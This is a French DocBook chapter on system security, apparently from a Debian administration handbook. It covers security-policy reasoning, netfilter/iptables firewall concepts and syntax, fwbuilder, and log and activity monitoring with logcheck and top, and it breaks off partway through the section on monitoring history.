<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1" />
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>Pare-feu</keyword>
      <keyword>Netfilter</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>Sécurité</title>
  <highlights>
    <para>Un système d'information a, selon les cas, une importance variable ; parfois, il est vital à la survie d'une entreprise. Il doit donc être protégé en conséquence contre divers risques, ce que l'on regroupe communément sous l'appellation de sécurité.</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>Définir une politique de sécurité</title>

    <sidebar>
      <title><emphasis>ATTENTION</emphasis> Portée de ce chapitre</title>

      <para>La sécurité est un sujet vaste et sensible, que nous ne saurions traiter complètement dans le cadre d'un seul chapitre. Nous nous limiterons ici à délimiter quelques points importants et présenter quelques-uns des outils et méthodes qui peuvent servir dans le domaine, mais la littérature est abondante et des ouvrages entiers ont été écrits sur le sujet. On pourra par exemple se rapporter à l'ouvrage <citetitle>Sécuriser un réseau Linux</citetitle> de Bernard Boutherin et Benoît Delaunay (collection Cahiers de l'Admin, éditions Eyrolles) ; à <citetitle>Sécurité informatique, principes et méthode</citetitle> de Laurent Bloch et Christophe Wolfhugel (collection blanche, éditions Eyrolles également) ; ou, en anglais, à l'excellent <citetitle>Linux Server Security</citetitle> de Michael D. Bauer (éditions O'Reilly).</para>
    </sidebar>

    <para>Le terme de « sécurité » recouvre une vaste étendue de concepts, d'outils et de procédures, qui ne s'appliquent pas à tous les cas. Il convient de s'interroger sur ce que l'on souhaite accomplir pour choisir lesquels mettre en œuvre. Pour sécuriser un système, il faut se poser quelques questions ; si l'on se lance tête baissée dans la mise en œuvre d'outils, on risque de se focaliser sur certains aspects au détriment des plus importants.</para>

    <para>Il est donc crucial de se fixer un but. Pour cela, il s'agit d'apporter des réponses aux questions suivantes :</para>
    <itemizedlist>
      <listitem>
	<para>Que cherche-t-on à protéger ? La politique de sécurité à mener ne sera pas la même selon que l'on cherche à protéger les ordinateurs ou les données. Et s'il s'agit des données, il faudra également se demander lesquelles.</para>
      </listitem>
      <listitem>
	<para>Contre quoi cherche-t-on à se protéger ? Est-ce d'un vol de données confidentielles ? De la perte accidentelle de ces données ? De la perte de revenu associée à une interruption de service ?</para>
      </listitem>
      <listitem>
	<para>Également, de qui cherche-t-on à se protéger ? Les mesures de sécurité à mettre en place différeront largement selon que l'on cherche à se prémunir d'une faute de frappe d'un utilisateur habituel du système ou d'un groupe d'attaquants déterminés.</para>
      </listitem>
    </itemizedlist>

    <para>Il est d'usage d'appeler « risque » la conjonction des trois facteurs : ce qui doit être protégé, ce qu'on souhaite éviter et les éléments qui essaient de faire en sorte que cela arrive. La réunion des réponses à ces trois questions permet de modéliser ce risque. De cette modélisation découlera une politique de sécurité, qui se manifestera à son tour par des actions concrètes.</para>

    <sidebar>
      <title><emphasis>NOTE</emphasis> Remise en question permanente</title>

      <para>Bruce Schneier, un des experts mondialement reconnus en matière de sécurité (pas uniquement informatique, d'ailleurs) lutte contre un des mythes importants de la sécurité par l'expression « La sécurité est un processus, non un produit. » Les actifs à protéger évoluent au fil du temps, de même que les menaces qui pèsent dessus et les moyens dont disposent les attaquants potentiels. Il est donc important, même si une politique de sécurité a été parfaitement conçue et mise en œuvre, de ne pas s'endormir sur ses lauriers. Les composants du risque évoluant, la réponse à apporter à ce risque doit également évoluer à leur suite.</para>
    </sidebar>

    <para>Il faudra enfin prendre en compte les contraintes qui peuvent limiter la liberté d'action. Jusqu'où est-on prêt à aller pour sécuriser le système ? Cette question a un impact majeur et la réponse apportée est trop souvent formulée en seuls termes de coût, alors qu'il faut également se demander jusqu'à quel point la politique de sécurité peut incommoder les utilisateurs du système, ou en dégrader les performances, par exemple.</para>

    <para>Une fois que l'on a établi une modélisation du risque dont on cherche à se prémunir, on peut se pencher sur la définition d'une politique de sécurité.</para>

    <sidebar>
      <title><emphasis>NOTE</emphasis> Politiques extrêmes</title>

      <para>Dans certains cas, le choix des actions à mener pour sécuriser un système peut être extrêmement simple.</para>

      <para>Par exemple, si le système à protéger se compose exclusivement d'un ordinateur de récupération qu'on n'utilise que pour additionner des chiffres en fin de journée, on peut tout à fait raisonnablement décider de ne rien faire de spécial pour le protéger ; en effet, la valeur intrinsèque du système est faible, celle des données est nulle puisqu'elles ne sont pas stockées sur cet ordinateur et un attaquant potentiel ne gagnerait à s'infiltrer sur ce « système » qu'une calculatrice un peu encombrante. Le coût de la sécurisation d'un tel système dépasserait probablement largement celui du risque.</para>

      <para>À l'opposé, si l'on cherche à protéger absolument la confidentialité de données secrètes, au détriment de toute autre considération, une réponse appropriée serait la destruction complète de ces données (avec effacement des fichiers, puis pulvérisation des disques durs, dissolution dans de l'acide, etc.). Si les données doivent de plus être préservées, mais pas nécessairement accessibles, et si le coût n'est pas soumis à des contraintes, on pourra commencer en stockant ces données gravées sur des plaques de platine iridié stockées en divers bunkers répartis sous différentes montagnes dans le monde, chacun étant bien entendu entièrement secret mais gardé par des armées entières…</para>

      <para>Pour extrêmes qu'ils puissent paraître, ces deux exemples n'en sont pas moins des réponses adaptées à des risques définis, dans la mesure où ils découlent d'une réflexion qui prend en compte les buts à atteindre et les contraintes présentes. Lorsqu'il s'agit d'une décision raisonnée, aucune politique de sécurité n'est moins respectable qu'une autre.</para>
    </sidebar>

    <para>Dans la plupart des cas, on s'apercevra que le système informatique peut être segmenté en sous-ensembles cohérents plus ou moins indépendants. Chacun de ces sous-systèmes pourra avoir ses besoins et ses contraintes propres ; il faudra donc en général les considérer séparément lors de la définition des politiques de sécurité correspondantes. Il conviendra alors de toujours garder à l'esprit le principe selon lequel un périmètre court et bien défini est plus facile à défendre qu'une frontière vague et longue. L'organisation du réseau devra donc être pensée en conséquence, afin que les services les plus sensibles soient concentrés sur un petit nombre de machines et que ces machines ne soient accessibles qu'à travers un nombre minimal de points de passage, plus faciles à sécuriser que s'il faut défendre chacune des machines contre l'intégralité du monde extérieur. On voit clairement apparaître ici l'utilité des solutions de filtrage du trafic réseau, notamment par des pare-feu. On pourra pour cela utiliser du matériel dédié, mais une solution peut-être plus simple et plus souple est d'utiliser un pare-feu logiciel, tel que celui intégré dans le noyau Linux.</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>Pare-feu ou filtre de paquets</title>
    <indexterm><primary>pare-feu</primary></indexterm>
    <indexterm><primary>filtre de paquets</primary></indexterm>

    <sidebar>
      <title><emphasis>B.A.-BA</emphasis> Pare-feu</title>
      <indexterm><primary>paquet</primary><secondary>IP</secondary></indexterm>

      <para>Un pare-feu <foreignphrase>(firewall)</foreignphrase> est un ensemble matériel ou logiciel qui trie les paquets qui circulent par son intermédiaire, en provenance ou vers le réseau local, et ne laisse passer que ceux qui vérifient certaines conditions.</para>
    </sidebar>

    <para>Un pare-feu est une passerelle filtrante : il applique des règles de filtrage aux paquets qui le traversent (c'est pourquoi il n'est utile qu'en tant que point de passage obligé).</para>

    <para>L'absence de configuration standard explique qu'il n'y ait pas de solution prête à l'emploi. Des outils permettent en revanche de simplifier la configuration du pare-feu netfilter en visualisant graphiquement les règles définies. L'un des meilleurs est sans doute <command>fwbuilder</command>.</para>
    <indexterm><primary><emphasis>netfilter</emphasis></primary></indexterm>

    <sidebar>
      <title><emphasis>CAS PARTICULIER</emphasis> Pare-feu local</title>

      <para>Un pare-feu peut limiter son action à une seule machine (et non pas un réseau local complet) ; son rôle principal est alors de refuser ou limiter l'accès à certains services, voire de se prémunir contre l'établissement de connexions sortantes par des logiciels indésirables que l'utilisateur pourrait avoir installés (volontairement ou pas).</para>
    </sidebar>

    <para>Le noyau Linux intègre le pare-feu netfilter ; les outils <command>iptables</command> et <command>ip6tables</command> permettent de le configurer. La différence entre ces deux outils se limite à ce que le premier agit sur le réseau IPv4 alors que le second intervient sur le réseau IPv6. Les deux piles réseau étant amenées à cohabiter pendant de nombreuses années, il faudra faire usage des deux outils en parallèle.</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>
    <indexterm><primary><command>ip6tables</command></primary></indexterm>
    <section id="sect.netfilter">
      <title>Fonctionnement de netfilter</title>

      <para>netfilter dispose de quatre tables distinctes, donnant les règles régissant trois types d'opérations sur les paquets :</para>
      <itemizedlist>
        <listitem>
	  <para><literal>filter</literal> pour les règles de filtrage (accepter, refuser, ignorer un paquet) ;</para>
        </listitem>
        <listitem>
	  <para><literal>nat</literal> pour modifier les adresses IP et les ports sources ou destinataires des paquets ;</para>
        </listitem>
        <listitem>
	  <para><literal>mangle</literal> pour modifier d'autres paramètres des paquets IP (notamment le champ ToS — <foreignphrase>Type Of Service</foreignphrase> — et les options) ;</para>
        </listitem>
        <listitem>
	  <para><literal>raw</literal> pour effectuer des manipulations manuelles sur les paquets avant que le suivi de connexion entre en jeu.</para>
        </listitem>
      </itemizedlist>

      <para>Chaque table contient des listes de règles appelées chaînes ; les chaînes standards servent au pare-feu pour traiter les paquets dans différentes circonstances prédéfinies. L'administrateur peut créer d'autres chaînes, qui ne seront employées que si l'une des chaînes standards les appelle.</para>
      <indexterm><primary>chaîne</primary></indexterm>
      <indexterm><primary>règle de filtrage</primary></indexterm>

      <para>La table <literal>filter</literal> compte trois chaînes standards :</para>
      <itemizedlist>
        <listitem>
	  <para><literal>INPUT</literal> : concerne les paquets destinés au pare-feu ;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal> : concerne les paquets émis par le pare-feu ;</para>
        </listitem>
        <listitem>
	  <para><literal>FORWARD</literal> : appliquée aux paquets transitant via le pare-feu (et dont il n'est donc ni la source ni le destinataire).</para>
        </listitem>
      </itemizedlist>

      <para>La table <literal>nat</literal> dispose également de trois chaînes standards :</para>
      <itemizedlist>
        <listitem>
	  <para><literal>PREROUTING</literal> : modifie les paquets dès qu'ils arrivent ;</para>
        </listitem>
        <listitem>
	  <para><literal>POSTROUTING</literal> : modifie les paquets alors qu'ils sont prêts à partir ;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal> : modifie les paquets générés par le pare-feu lui-même.</para>
        </listitem>
      </itemizedlist>

      <figure id="figure.chaines-netfilter">
        <title>Ordre d'emploi des chaînes de <emphasis>netfilter</emphasis></title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>Chaque chaîne est une liste de règles, prévoyant une action à exécuter quand certaines conditions sont remplies. Le pare-feu parcourt séquentiellement la chaîne s'appliquant au paquet traité et dès qu'une règle est satisfaite, il « saute » (l'option <literal>-j</literal> vient de <foreignphrase>jump</foreignphrase>) à l'emplacement indiqué pour continuer le traitement. Certains de ces emplacements sont standardisés et correspondent aux actions les plus courantes. Une fois une de ces actions enclenchée, le parcours de la chaîne est interrompu parce que le sort du paquet est normalement décidé (sauf exception explicitement mentionnée ci-après) :</para>

      <sidebar>
        <title><emphasis>B.A.-BA</emphasis> ICMP</title>

	<para>ICMP (<foreignphrase>Internet Control Message Protocol</foreignphrase>, ou protocole des messages de contrôle sur Internet) est très employé pour transmettre des compléments d'information sur les communications : il permet de tester le fonctionnement du réseau avec la commande <command>ping</command> (qui envoie un message ICMP <foreignphrase>echo request</foreignphrase> auquel le correspondant est normalement tenu de répondre par un message <foreignphrase>echo reply</foreignphrase>), signale le refus d'un paquet par un pare-feu, indique la saturation d'un tampon de réception, propose une meilleure route (un meilleur trajet pour les prochains paquets à émettre), etc. Plusieurs RFC définissent ce protocole ; les premières, 777 et 792, furent rapidement complétées et étendues. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>

	<para>Rappelons qu'un tampon de réception est une petite zone mémoire contenant les données reçues par le réseau avant qu'elles ne soient traitées par le noyau. Si cette zone est pleine, il est alors impossible de recevoir d'autres données et ICMP signale le problème de sorte que le correspondant réduise la vitesse de transfert pour essayer d'atteindre un équilibre.</para>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary><foreignphrase>Internet Control Message Protocol</foreignphrase></primary></indexterm>
        <indexterm><primary>tampon de réception</primary></indexterm>
        <indexterm><primary>réception, tampon</primary></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

	<para>Alors qu'un réseau IPv4 peut fonctionner sans ICMP, ICMPv6 est absolument indispensable dans le cadre d'un réseau IPv6 car il combine des fonctions jusqu'alors partagées entre ICMPv4, IGMP <foreignphrase>(Internet Group Membership Protocol)</foreignphrase> et ARP <foreignphrase>(Address Resolution Protocol)</foreignphrase>. La RFC 4 443 définit ce protocole. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
      </sidebar>

      <para></para>
      <itemizedlist>
        <listitem>
	  <para><literal>ACCEPT</literal> : autoriser le paquet à poursuivre son parcours ;</para>
        </listitem>
        <listitem>
	  <para><literal>REJECT</literal> : rejeter le paquet (ICMP signale une erreur, l'option <literal>--reject-with <replaceable>type</replaceable></literal> d'<command>iptables</command> permet de choisir le type d'erreur renvoyée) ;</para>
        </listitem>
        <listitem>
	  <para><literal>DROP</literal> : supprimer (ignorer) le paquet ;</para>
        </listitem>
        <listitem>
	  <para><literal>LOG</literal> : enregistrer (via <command>syslogd</command>) un message de log contenant une description du paquet traité (cette action retourne après exécution à sa position dans la chaîne appelante — celle qui a invoquée l'action — c'est pourquoi il est nécessaire de la faire suivre par une règle REJECT ou DROP si l'on veut simplement enregistrer la trace d'un paquet qui doit être refusé) ;</para>
        </listitem>
        <listitem>
	  <para><literal>ULOG</literal> : enregistrer un message de log via <command>ulogd</command>, plus adapté et plus efficace que <command>syslogd</command> pour gérer de grandes quantités de messages (cette action renvoie aussi le fil d'exécution à sa position dans la chaîne appelante) ;</para>
        </listitem>
        <listitem>
	  <para><replaceable>nom_de_chaîne</replaceable> : évaluer les règles de la chaîne indiquée ;</para>
        </listitem>
        <listitem>
	  <para><literal>RETURN</literal> : stopper l'évaluation de la chaîne courante et revenir sur la chaîne appelante (si la chaîne courante est une chaîne standard, dépourvue de chaîne appelante, effectuer l'action par défaut — il s'agit d'une action particulière qui se configure avec l'option <literal>-P</literal> de <command>iptables</command>) ;</para>
        </listitem>
        <listitem>
	  <para><literal>SNAT</literal> (seulement dans la table <literal>nat</literal> : effectuer du <foreignphrase>Source NAT</foreignphrase> (des options précisent les modifications à effectuer) ;</para>
        </listitem>
        <listitem>
	  <para><literal>DNAT</literal> (seulement dans la table <literal>nat</literal>) : effectuer du <foreignphrase>Destination NAT</foreignphrase> (des options précisent les modifications à effectuer) ;</para>
        </listitem>
        <listitem>
	  <para><literal>MASQUERADE</literal> (seulement dans la table <literal>nat</literal>) : effectuer du <command>masquerading</command> (SNAT particulier) ;</para>
        </listitem>
        <listitem>
	  <para><literal>REDIRECT</literal> (seulement dans la table <literal>nat</literal>) : rediriger un paquet vers un port particulier du pare-feu lui-même ; action notamment utile pour mettre en place un mandataire (ou proxy) web transparent (il s'agit d'un service pour lequel aucune configuration côté client n'est nécessaire, puisque le client a l'impression de se connecter directement au destinataire alors que ses échanges avec le serveur transitent systématiquement par le mandataire).</para>
        </listitem>
      </itemizedlist>

      <para>D'autres actions, concernant davantage la table <literal>mangle</literal>, ne sont pas mentionnées ici. Vous en trouverez la liste exhaustive dans les pages de manuel <citerefentry><refentrytitle>iptables</refentrytitle><manvolnum>8</manvolnum></citerefentry> et <citerefentry><refentrytitle>ip6tables</refentrytitle><manvolnum>8</manvolnum></citerefentry>.</para>
    </section>
    <section id="sect.iptables">
      <title>Syntaxe de <command>iptables</command> et <command>ip6tables</command></title>

      <para>Les commandes <command>iptables</command> et <command>ip6tables</command> permettent de manipuler les tables, les chaînes et les règles. L'option <literal>-t <replaceable>table</replaceable></literal> indique la table sur laquelle opérer (par défaut, c'est <literal>filter</literal>).</para>
      <indexterm><primary><command>iptables</command></primary></indexterm>
      <indexterm><primary><command>ip6tables</command></primary></indexterm>
      <section id="sect.iptables-command">
        <title>Les commandes</title>

	<para>L'option <literal>-N <replaceable>chaîne</replaceable></literal> crée une nouvelle chaîne ; l'option <literal>-X <replaceable>chaîne</replaceable></literal> supprime une chaîne vide et inutilisée. L'option <literal>-A <replaceable>chaîne</replaceable> <replaceable>règle</replaceable></literal> ajoute une règle à la fin de la chaîne indiquée. L'option <literal>-I <replaceable>chaîne</replaceable> <replaceable>numrègle</replaceable> <replaceable>règle</replaceable></literal> insère une règle avant la règle numérotée <replaceable>numrègle</replaceable>. L'option <literal>-D <replaceable>chaîne</replaceable> <replaceable>numrègle</replaceable></literal> ou <literal>-D <replaceable>chaîne</replaceable> <replaceable>règle</replaceable></literal> supprime une règle dans la chaîne (la première syntaxe l'identifie par son numéro et la seconde par son contenu). L'option <literal>-F <replaceable>chaîne</replaceable></literal> supprime toutes les règles de la chaîne (si celle-ci n'est pas mentionnée, elle supprime toutes les règles de la table). L'option <literal>-L <replaceable>chaîne</replaceable></literal> affiche le contenu de la chaîne. Enfin, l'option <literal>-P <replaceable>chaîne</replaceable> <replaceable>action</replaceable></literal> définit l'action par défaut pour la chaîne donnée (seules les chaînes standards peuvent en avoir une).</para>
      </section>
      <section id="sect.iptables-rules">
        <title>Les règles</title>
        <indexterm><primary>règle de filtrage</primary></indexterm>

	<para>Chaque règle s'exprime sous la forme <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable> <replaceable>options_de_l'action</replaceable></literal>. En écrivant bout à bout plusieurs conditions dans la même règle, on en produit la conjonction (elles sont liées par des <emphasis>et</emphasis> logiques), donc une condition plus restrictive.</para>

	<para>La condition <literal>-p <replaceable>protocole</replaceable></literal> sélectionne selon le champ protocole du paquet IP, dont les valeurs les plus courantes sont <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal> et <literal>icmpv6</literal>. Préfixer la condition par un point d'exclamation inverse la condition (qui correspond alors à tous les paquets n'ayant pas le protocole indiqué). Cette manipulation est possible pour toutes les autres conditions énoncées ci-dessous.</para>

	<para>La condition <literal>-s <replaceable>adresse</replaceable></literal> ou <literal>-s <replaceable>réseau/masque</replaceable></literal> vérifie l'adresse source du paquet ; <literal>-d <replaceable>adresse</replaceable></literal> ou <literal>-d <replaceable>réseau/masque</replaceable></literal> en est le pendant pour l'adresse de destination.</para>

	<para>La condition <literal>-i <replaceable>interface</replaceable></literal> sélectionne les paquets provenant de l'interface réseau indiquée ; <literal>-o <replaceable>interface</replaceable></literal> sélectionne les paquets en fonction de leur interface réseau d'émission.</para>

	<para>D'autres conditions plus spécifiques existent, qui dépendent des conditions génériques déjà définies. La condition <literal>-p tcp</literal> peut par exemple être accompagnée de conditions sur les ports TCP avec <literal>--source-port <replaceable>port</replaceable></literal> et <literal>--destination-port <replaceable>port</replaceable></literal>.</para>

	<para>L'option <literal>--state <replaceable>état</replaceable></literal> indique le statut du paquet dans une connexion (le module <command>ipt_conntrack</command>, qui implémente le suivi des connexions, lui est nécessaire). L'état <literal>NEW</literal> désigne un paquet qui débute une nouvelle connexion. L'état <literal>ESTABLISHED</literal> concerne les paquets d'une connexion existante et l'état <literal>RELATED</literal> les paquets d'une nouvelle connexion liée à une connexion existante (c'est le cas des connexions <literal>ftp-data</literal> d'une session <literal>ftp</literal> en mode "actif").</para>

	<para>La section précédente détaille la liste des actions possibles, mais pas les options qui leur sont associées. L'action <literal>LOG</literal> dispose ainsi de plusieurs options visant à :</para>
        <itemizedlist>
          <listitem>
	    <para>indiquer le niveau de sévérité du message à <command>syslog</command> (<literal>--log-level</literal>, dont la valeur par défaut est <literal>warning</literal>) ;</para>
          </listitem>
          <listitem>
	    <para>préciser un préfixe textuel pour différencier les messages (<literal>--log-prefix</literal>) ;</para>
          </listitem>
          <listitem>
	    <para>indiquer les données à intégrer dans le message (<literal>--log-tcp-sequence</literal> pour le numéro de séquence TCP, <literal>--log-tcp-options</literal> pour les options TCP et <literal>--log-ip-options</literal> pour les options IP).</para>
          </listitem>
        </itemizedlist>

	<para>L'action <literal>DNAT</literal> dispose de l'option <literal>--to-destination <replaceable>adresse</replaceable>:<replaceable>port</replaceable></literal> pour indiquer la nouvelle adresse IP et/ou le nouveau port de destination. De la même manière, l'action <literal>SNAT</literal> dispose de l'option <literal>--to-source <replaceable>adresse</replaceable>:<replaceable>port</replaceable></literal> pour indiquer la nouvelle adresse et/ou le nouveau port source.</para>

	<para>L'action <literal>REDIRECT</literal> (seulement disponible si le NAT est disponible) a une option <literal>--to-ports <replaceable>port(s)</replaceable></literal> pour indiquer le port ou l'intervalle de ports vers lesquels rediriger les paquets.</para>
      </section>
    </section>
    <section id="sect.creating-rules">
      <title>Créer les règles</title>

      <para>Il faut invoquer <command>iptables</command>/<command>ip6tables</command> une fois par règle à créer ; c'est pourquoi on consigne habituellement tous les appels à cette commande dans un fichier de script pour mettre en place la même configuration à chaque redémarrage de la machine. On peut écrire ce script à la main mais il est souvent intéressant de le préparer à l'aide d'un outil de plus haut niveau, tel que <command>fwbuilder</command>.</para>

      
      <screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>

      <para>Son principe est simple. Dans une première étape, il faut décrire tous les éléments susceptibles d'intervenir dans les différentes règles :</para>
      <itemizedlist>
        <listitem>
	  <para>le pare-feu et ses interfaces réseau ;</para>
        </listitem>
        <listitem>
	  <para>les réseaux (et plages d'IP associées) ;</para>
        </listitem>
        <listitem>
	  <para>les serveurs ;</para>
        </listitem>
        <listitem>
	  <para>les ports correspondant aux services hébergés sur les différents serveurs.</para>
        </listitem>
      </itemizedlist>

      <para>On crée ensuite les règles par simple glisser/déposer des différents objets, quelques menus contextuels servant à modifier la condition (l'inverser, par exemple). Il ne reste qu'à saisir l'action souhaitée et à la paramétrer.</para>

      <para>On peut soit créer 2 jeux de règles différents pour IPv4 et IPv6, soit n'en créer qu'un seul et laisser <command>fwbuilder</command> traduire les règles adéquates en fonction des différentes adresses assignées aux objets manipulés.</para>

      <figure id="figure.fwbuilder">
        <title>Fwbuilder en action</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
          </imageobject>
        </mediaobject>
      </figure>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>

      <para><command>fwbuilder</command> peut alors générer un script de configuration du pare-feu selon les règles saisies. Son architecture modulaire lui permet de générer des scripts pour les pare-feu de différents systèmes (<command>iptables</command> pour Linux, <command>ipf</command> pour FreeBSD et <command>pf</command> pour OpenBSD).</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>Installer les règles à chaque démarrage</title>

      <para>Dans les autres cas, le plus simple est d'inscrire le script de configuration du pare-feu dans une directive <literal>up</literal> du fichier <filename>/etc/network/interfaces</filename>. Dans l'exemple ci-dessous, ce script s'appelle <filename>/usr/local/etc/arrakis.fw</filename>.</para>

      <example id="example.network-interfaces-firewall">
        <title>Fichier <varname>interfaces</varname> avec appel du script de pare-feu</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw</programlisting>
      </example>
      <para>Ces exemples supposent que les interfaces réseau sont configurées par <emphasis role="pkg">ifupdown</emphasis>. Si vous utilisez un autre outil (par exemple <emphasis>NetworkManager</emphasis> ou <emphasis>systemd-networkd</emphasis>), il faudra vous référer à la documentation spécifique de cet outil pour trouver le moyen d'exécuter un script après la mise en marche de l'interface.</para>

    </section>
  </section>
  <section id="sect.supervision">
    <title>Supervision : prévention, détection, dissuasion</title>
    <indexterm><primary>supervision</primary></indexterm>

    <para>La supervision fait partie intégrante d'une politique de sécurité. Elle est nécessaire à plusieurs titres : l'objectif de la sécurité n'est pas uniquement de garantir la confidentialité des données, mais aussi d'assurer le bon fonctionnement des services. Il est donc impératif de veiller à ce que tout fonctionne comme prévu et de détecter au plus tôt les comportements inhabituels et les changements dans la qualité du service fourni. Surveiller l'activité peut permettre de détecter des tentatives d'intrusion et donc de s'en protéger avant que cela ne porte à conséquences. Ce chapitre va passer en revue des outils servant à surveiller différents aspects d'un système Debian. Il complète la <xref linkend="sect.monitoring" />.</para>
    <section id="sect.logcheck">
      <title>Surveillance des logs avec <command>logcheck</command></title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>logs</primary><secondary>surveillance</secondary></indexterm>
      <indexterm><primary>surveillance</primary><secondary>des logs</secondary></indexterm>

      <para>Le programme <command>logcheck</command> scrute par défaut les fichiers de logs toutes les heures et envoie par courrier électronique à <literal>root</literal> les messages les plus inhabituels pour aider à détecter tout nouveau problème.</para>

      <para>La liste des fichiers scrutés se trouve dans le fichier <filename>/etc/logcheck/logcheck.logfiles</filename> ; les choix par défaut conviendront si le fichier <filename>/etc/rsyslog.conf</filename> n'a pas été complètement remodelé.</para>

      <para><command>logcheck</command> peut fonctionner en 3 modes plus ou moins détaillés : <foreignphrase>paranoid</foreignphrase> (paranoïaque), <foreignphrase>server</foreignphrase> (serveur) et <foreignphrase>workstation</foreignphrase> (station de travail). Le premier étant le plus verbeux, on le réservera aux serveurs spécialisés (comme les pare-feu). Le deuxième mode, choisi par défaut, est recommandé pour les serveurs. Le dernier, prévu pour les stations de travail, élimine encore plus de messages.</para>

      <para>Dans tous les cas, il faudra probablement paramétrer <command>logcheck</command> pour exclure des messages supplémentaires (selon les services installés) sous peine d'être envahi chaque heure par une multitude de messages inintéressants. Leur mécanisme de sélection étant relativement complexe, il faut lire à tête reposée le document <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> pour bien le comprendre.</para>

      <para>Plusieurs types de règles sont appliqués :</para>
      <itemizedlist>
        <listitem>
	  <para>celles qui qualifient un message comme résultant d'une tentative d'attaque (elles sont stockées dans un fichier du répertoire <filename>/etc/logcheck/cracking.d/</filename>) ;</para>
        </listitem>
        <listitem>
	  <para>celles qui annulent cette qualification (<filename>/etc/logcheck/cracking.ignore.d/</filename>) ;</para>
        </listitem>
        <listitem>
	  <para>celles qui qualifient un message comme une alerte de sécurité (<filename>/etc/logcheck/violations.d/</filename>) ;</para>
        </listitem>
        <listitem>
	  <para>celles qui annulent cette qualification (<filename>/etc/logcheck/violations.ignore.d/</filename>) ;</para>
        </listitem>
        <listitem>
	  <para>et enfin celles qui s'appliquent à tous les messages restants (les <foreignphrase>System Events</foreignphrase>, ou événements système).</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>ATTENTION</emphasis> Ignorer un message</title>

	<para>Tout message marqué comme une tentative d'attaque ou une alerte de sécurité (suite par exemple à une règle du fichier <filename>/etc/logcheck/violations.d/monfichier</filename>) ne pourra être ignoré que par une règle des fichiers <filename>/etc/logcheck/violations.ignore.d/monfichier</filename> ou <filename>/etc/logcheck/violations.ignore.d/monfichier-<replaceable>extension</replaceable></filename>.</para>
      </sidebar>

      <para>Un événement système sera systématiquement signalé, sauf si une règle de l'un des répertoires <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> dicte de l'ignorer. Évidemment, seuls les répertoires correspondant à des niveaux de verbosité supérieurs ou égaux au niveau sélectionné sont pris en compte.</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>Surveillance de l'activité</title>
      <indexterm><primary>surveillance</primary><secondary>de l'activité</secondary></indexterm>
      <indexterm><primary>activité, surveillance</primary></indexterm>
      <section id="sect.real-time-monitoring">
        <title>En temps réel</title>

	<para><command>top</command> est un utilitaire interactif qui affiche la liste des processus en cours d'exécution. Par défaut, son critère de tri est l'utilisation actuelle du processeur (touche <keycap>P</keycap>), mais on peut opter pour la mémoire occupée (touche <keycap>M</keycap>), le temps processeur consommé (touche <keycap>T</keycap>) ou le numéro de processus ou PID (touche <keycap>N</keycap>). La touche <keycap>k</keycap> (comme <foreignphrase>kill</foreignphrase>) nécessite un numéro de processus à tuer. <keycap>r</keycap> (comme <foreignphrase>renice</foreignphrase>) change la priorité d'un processus.</para>
        <indexterm><primary><command>top</command></primary></indexterm>

	<para>Si le processeur semble être surchargé, il est ainsi possible d'observer quels processus se battent pour son contrôle ou consomment toute la mémoire disponible. Il est intéressant en particulier de vérifier si les processus qui consomment des ressources correspondent effectivement aux services réels que la machine héberge. Un processus au nom inconnu tournant sous l'utilisateur <literal>www-data</literal> doit immédiatement attirer l'attention : la probabilité est forte que cela corresponde à un logiciel installé et exécuté sur la machine en exploitant une faille de sécurité d'une application web.</para>

	<para><command>top</command> est un outil de base très souple et sa page de manuel explique comment en personnaliser l'affichage pour l'adapter aux besoins et aux habitudes de chacun.</para>

        <para>L'outil graphique <command>gnome-system-monitor</command> est similaire à <command>top</command>, et il propose sensiblement les mêmes fonctionnalités.</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>Historique</title>
        <indexterm><primary>activité, historique</primary></indexterm>

	<para>La charge du processeur, le trafic réseau et l'espace disque disponible sont des informations qui varient en permanence. Il est souvent intéressant de garder une trace de leur évolution pour mieux cerner l'usage qui est fait de l'ordinateur.</para>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary><foreignphrase>Simple Network Management Protocol</foreignphrase></primary></indexterm>

	<para>Il existe de nombreux outils dédié à cette tâche. La plupart peuvent récupérer des données via SNMP (<foreignphrase>Simple Network Management Protocol</foreignphrase>, ou protocole simple de gestion du réseau) afin de centraliser ces informations. Cela permet en outre de récupérer des informations sur des éléments du réseau qui ne sont pas nécessairement des ordinateurs (comme des routeurs).</para>

